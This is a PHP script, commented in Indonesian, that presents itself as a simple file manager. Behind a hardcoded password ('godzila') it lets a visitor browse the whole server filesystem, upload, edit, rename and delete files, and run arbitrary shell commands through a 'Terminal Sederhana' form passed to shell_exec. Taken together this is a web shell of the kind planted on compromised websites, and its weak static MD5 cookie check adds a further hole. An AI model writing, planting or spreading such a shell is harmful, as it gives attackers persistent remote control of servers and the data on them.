<?php
// =======================================================
// === PENGATURAN KEAMANAN ===
// Ganti dengan kata sandi yang kuat!
define('PASSWORD', 'godzila');

// Periksa otentikasi
if (!isset($_COOKIE['login']) || $_COOKIE['login'] !== md5(PASSWORD)) {
    if (isset($_POST['password']) && md5($_POST['password']) === md5(PASSWORD)) {
        setcookie('login', md5(PASSWORD), time() + 3600); // Cookie berlaku 1 jam
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    // Tampilkan formulir login
    die('
    <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
        <form method="post">
            <input type="password" name="password" placeholder="Masukkan Kata Sandi" required>
            <button type="submit">Masuk</button>
        </form>
    </body>
    ');
}

// =======================================================
// === FUNGSI UTAMA ===

// Fungsi untuk membuat path yang aman
function get_safe_path($requested_path) {
    $requested_path = trim($requested_path);
    if ($requested_path === '' || $requested_path === '/') {
        return '/';
    }
    // Periksa apakah path dimulai dengan /
    if (substr($requested_path, 0, 1) !== '/') {
        // Jika tidak, asumsikan itu path relatif dari direktori skrip
        $requested_path = realpath(__DIR__ . DIRECTORY_SEPARATOR . $requested_path);
    }
    $safe_path = realpath($requested_path);
    if ($safe_path === false) {
        return '/'; // Kembali ke root jika path tidak valid
    }
    return $safe_path;
}

// Dapatkan path yang diminta dari URL atau default ke root
$current_path = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // Default ke direktori saat ini
$safe_path = get_safe_path($current_path);

// Fungsi untuk membersihkan nama file
function sanitize_filename($filename) {
    return basename($filename);
}

// Logika untuk CRUD
$message = '';
$action_completed = false;

// CREATE (Upload File)
if (isset($_FILES['new_file']) && $_FILES['new_file']['error'] === UPLOAD_ERR_OK) {
    $file_tmp = $_FILES['new_file']['tmp_name'];
    $file_name = sanitize_filename($_FILES['new_file']['name']);
    $target_path = $safe_path . DIRECTORY_SEPARATOR . $file_name;

    if (move_uploaded_file($file_tmp, $target_path)) {
        $message = "File berhasil diunggah: " . htmlspecialchars($file_name);
        $action_completed = true;
    } else {
        $message = "Gagal mengunggah file. Pastikan direktori bisa ditulis.";
    }
}

// CREATE (Buat File Baru)
if (isset($_POST['action']) && $_POST['action'] === 'create_file') {
    $file_name = sanitize_filename($_POST['file_name']);
    $file_path = $safe_path . DIRECTORY_SEPARATOR . $file_name;

    if (empty($file_name)) {
        $message = "Nama file tidak boleh kosong.";
    } elseif (file_exists($file_path)) {
        $message = "File dengan nama tersebut sudah ada.";
    } else {
        if (touch($file_path)) {
            $message = "File ' " . htmlspecialchars($file_name) . " ' berhasil dibuat.";
            $action_completed = true;
        } else {
            $message = "Gagal membuat file.";
        }
    }
}

// CREATE (Buat Direktori Baru)
if (isset($_POST['action']) && $_POST['action'] === 'create_directory') {
    $dir_name = sanitize_filename($_POST['dir_name']);
    $dir_path = $safe_path . DIRECTORY_SEPARATOR . $dir_name;
    
    if (empty($dir_name)) {
        $message = "Nama direktori tidak boleh kosong.";
    } elseif (file_exists($dir_path)) {
        $message = "Direktori dengan nama tersebut sudah ada.";
    } else {
        if (mkdir($dir_path, 0755)) { // 0755 adalah izin default
            $message = "Direktori ' " . htmlspecialchars($dir_name) . " ' berhasil dibuat.";
            $action_completed = true;
        } else {
            $message = "Gagal membuat direktori.";
        }
    }
}

// UPDATE (Rename File)
if (isset($_POST['action']) && $_POST['action'] === 'rename') {
    $old_name = sanitize_filename($_POST['old_name']);
    $new_name = sanitize_filename($_POST['new_name']);
    $old_path = $safe_path . DIRECTORY_SEPARATOR . $old_name;
    $new_path = $safe_path . DIRECTORY_SEPARATOR . $new_name;

    if (file_exists($old_path) && rename($old_path, $new_path)) {
        $message = "File berhasil diganti nama.";
        $action_completed = true;
    } else {
        $message = "Gagal mengganti nama file.";
    }
}

// UPDATE (Edit File Content)
if (isset($_POST['action']) && $_POST['action'] === 'save_content') {
    $file_name = sanitize_filename($_POST['file_name']);
    $file_path = $safe_path . DIRECTORY_SEPARATOR . $file_name;
    $content = $_POST['content'];

    if (file_exists($file_path) && is_writable($file_path)) {
        if (file_put_contents($file_path, $content) !== false) {
            $message = "Konten file berhasil disimpan.";
        } else {
            $message = "Gagal menyimpan konten file.";
        }
    } else {
        $message = "File tidak ditemukan atau tidak dapat ditulis.";
    }
    $action_completed = true;
}

// DELETE (Hapus File)
if (isset($_GET['action']) && $_GET['action'] === 'delete') {
    $file_name = sanitize_filename($_GET['file']);
    $file_path = $safe_path . DIRECTORY_SEPARATOR . $file_name;

    if (file_exists($file_path) && is_file($file_path) && unlink($file_path)) {
        $message = "File berhasil dihapus.";
        $action_completed = true;
    } else {
        $message = "Gagal menghapus file.";
    }
}

// Eksekusi Perintah Terminal
if (isset($_POST['action']) && $_POST['action'] === 'execute_command') {
    $command = $_POST['command'];
    if (!empty($command)) {
        // Eksekusi perintah dan tangkap outputnya
        $output = shell_exec($command);
        $message = 'Output Perintah: <pre style="background-color: #333; color: #0f0; padding: 10px; border-radius: 5px; white-space: pre-wrap;">' . htmlspecialchars($output) . '</pre>';
    }
    $action_completed = false; // Jangan redirect setelah menjalankan perintah
}

// Redirect setelah aksi agar URL bersih
if ($action_completed) {
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_path));
    exit;
}

// Baca (READ) semua file di direktori saat ini
if (!is_dir($safe_path)) {
    die("Direktori tidak ditemukan.");
}
$items = array_diff(scandir($safe_path), ['.', '..']);
$file_details = [];
foreach ($items as $item) {
    $item_path = $safe_path . DIRECTORY_SEPARATOR . $item;
    if (!file_exists($item_path)) continue;
    $file_details[] = [
        'name' => $item,
        'permissions' => substr(sprintf('%o', fileperms($item_path)), -4),
        'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($item_path))['name'] : fileowner($item_path),
        'group' => function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($item_path))['name'] : filegroup($item_path),
        'size' => is_dir($item_path) ? '-' : filesize($item_path),
        'modified' => date('Y-m-d H:i:s', filemtime($item_path)),
        'path' => $safe_path . DIRECTORY_SEPARATOR . $item,
        'is_dir' => is_dir($item_path)
    ];
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Manajer File - <?php echo htmlspecialchars($safe_path); ?></title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: auto; background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        h1, h2 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        .message { padding: 10px; margin-bottom: 20px; border-radius: 5px; color: #155724; background-color: #d4edda; border-color: #c3e6cb; }
        .message.error { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }
        .file-list { margin-top: 20px; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #f2f2f2; }
        .actions a { margin-right: 10px; text-decoration: none; }
        .actions a:hover { text-decoration: underline; }
        .path-display { background-color: #e9ecef; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; white-space: nowrap; }
        .path-display a { text-decoration: none; color: #007bff; }
        .path-display a:hover { text-decoration: underline; }
        textarea.file-editor { width: 100%; height: 500px; font-family: monospace; }
        .back-link { font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Manajer File Sederhana</h1>

        <?php if ($message): ?>
            <div class="message <?php echo strpos($message, 'Gagal') !== false ? 'error' : ''; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <div class="path-display">
            Path: 
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, $safe_path);
            $current_link = '';
            foreach ($parts as $part) {
                if ($part === '') continue;
                $current_link .= DIRECTORY_SEPARATOR . $part;
                echo '<a href="?dir=' . urlencode($current_link) . '">' . htmlspecialchars($part) . '</a>' . DIRECTORY_SEPARATOR;
            }
            ?>
        </div>
        <hr>

        <?php 
        // Cek apakah halaman edit file sedang diakses
        if (isset($_GET['action']) && $_GET['action'] === 'edit') {
            $file_name = sanitize_filename($_GET['file']);
            $file_path = $safe_path . DIRECTORY_SEPARATOR . $file_name;
            $file_content = file_exists($file_path) ? htmlspecialchars(file_get_contents($file_path)) : 'File tidak ditemukan.';
            ?>
            <h2>Mengedit File: <?php echo htmlspecialchars($file_name); ?></h2>
            <form action="?dir=<?php echo urlencode($current_path); ?>" method="post">
                <input type="hidden" name="action" value="save_content">
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($file_name); ?>">
                <textarea name="content" class="file-editor"><?php echo $file_content; ?></textarea><br>
                <button type="submit">Simpan Perubahan</button>
                <a href="?dir=<?php echo urlencode($current_path); ?>">Batal</a>
            </form>
            <?php
        } else {
            // Tampilkan daftar file dan folder
        ?>
        <div class="file-list">
            <table>
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th>Izin</th>
                        <th>Pemilik/Grup</th>
                        <th>Ukuran</th>
                        <th>Tanggal Modifikasi</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    // Tampilkan tautan ".." untuk kembali jika tidak di root
                    if ($safe_path !== '/') {
                        ?>
                        <tr>
                            <td><a href="?dir=<?php echo urlencode(dirname($safe_path)); ?>"><strong>..</strong></a></td>
                            <td></td>
                            <td></td>
                            <td></td>
                            <td></td>
                            <td></td>
                        </tr>
                        <?php
                    }
                    ?>
                    <?php foreach ($file_details as $item): ?>
                        <tr>
                            <td>
                                <?php if ($item['is_dir']): ?>
                                    <a href="?dir=<?php echo urlencode($item['path']); ?>"><strong><?php echo htmlspecialchars($item['name']); ?>/</strong></a>
                                <?php else: ?>
                                    <a href="?action=edit&file=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($current_path); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
                                <?php endif; ?>
                            </td>
                            <td><?php echo htmlspecialchars($item['permissions']); ?></td>
                            <td><?php echo htmlspecialchars($item['owner'] . '/' . $item['group']); ?></td>
                            <td><?php echo $item['is_dir'] ? '-' : number_format($item['size'] / 1024, 2) . ' KB'; ?></td>
                            <td><?php echo htmlspecialchars($item['modified']); ?></td>
                            <td class="actions">
                                <?php if (!$item['is_dir']): ?>
                                    <a href="#" onclick="showRenameForm('<?php echo htmlspecialchars($item['name']); ?>')">Ubah Nama</a> |
                                    <a href="?action=delete&file=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($current_path); ?>" onclick="return confirm('Yakin ingin menghapus <?php echo htmlspecialchars($item['name']); ?>?');" style="color:red;">Hapus</a>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <hr>

        <h2>Buat File atau Direktori</h2>
        <form action="?dir=<?php echo urlencode($current_path); ?>" method="post" style="display:inline-block; margin-right: 20px;">
            <input type="hidden" name="action" value="create_file">
            <input type="text" name="file_name" placeholder="Nama File Baru" required>
            <button type="submit">Buat File</button>
        </form>
        <form action="?dir=<?php echo urlencode($current_path); ?>" method="post" style="display:inline-block;">
            <input type="hidden" name="action" value="create_directory">
            <input type="text" name="dir_name" placeholder="Nama Direktori Baru" required>
            <button type="submit">Buat Direktori</button>
        </form>

        <hr>

        <h2>Unggah File</h2>
        <form action="?dir=<?php echo urlencode($current_path); ?>" method="post" enctype="multipart/form-data">
            <input type="file" name="new_file" required>
            <button type="submit">Unggah</button>
        </form>
        
        <hr>
        
        <h2>Terminal Sederhana</h2>
        <form action="?dir=<?php echo urlencode($current_path); ?>" method="post">
            <input type="hidden" name="action" value="execute_command">
            <input type="text" name="command" style="width: 80%;" placeholder="Masukkan perintah (misal: ls -la)" required>
            <button type="submit">Jalankan</button>
        </form>
        <?php } // Akhir dari else untuk tampilan utama ?>
    </div>

    <div id="rename-form" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#fff; padding:20px; border:1px solid #ccc; box-shadow:0 0 10px rgba(0,0,0,0.5);">
        <h3>Ubah Nama File</h3>
        <form action="?dir=<?php echo urlencode($current_path); ?>" method="post">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old_name" id="old-name-input">
            <input type="text" name="new_name" id="new-name-input" required>
            <button type="submit">Simpan</button>
            <button type="button" onclick="document.getElementById('rename-form').style.display='none';">Batal</button>
        </form>
    </div>

    <script>
        function showRenameForm(fileName) {
            document.getElementById('old-name-input').value = fileName;
            document.getElementById('new-name-input').value = fileName;
            document.getElementById('rename-form').style.display = 'block';
        }
    </script>
</body>
</html>
